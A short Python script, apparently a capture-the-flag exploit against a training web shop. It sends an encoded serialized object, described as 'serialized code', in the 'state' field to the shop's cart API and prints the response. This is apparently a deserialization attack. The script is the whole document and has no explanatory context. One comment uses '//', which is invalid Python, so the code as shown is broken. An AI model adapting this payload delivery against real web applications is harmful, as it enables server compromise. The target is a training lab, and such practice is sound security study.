import requests

url = "http://lolshop.training.jinblack.it"

//we're inserting the serialized code into the "state"

state = "eJxNjm0KwkAMRHuWHGDr1qqQHqJeoWSjBPpFNgVBvLtbt8JCfgxv3kB6vCHcdQkbGeAF3xG9R6gOVEmATtB3CZ8LPA8TQ4Itwj82p6IPHEllNVnmQ9vJHv210FYh2zTPk+NcnS8yKVv9GIens5f9dm25UyHOj32+TNs7FQ=="

def cart():
    r = requests.post(url + "/api/cart.php", data = {
        "state": state
    })
    print(r.text)

cart()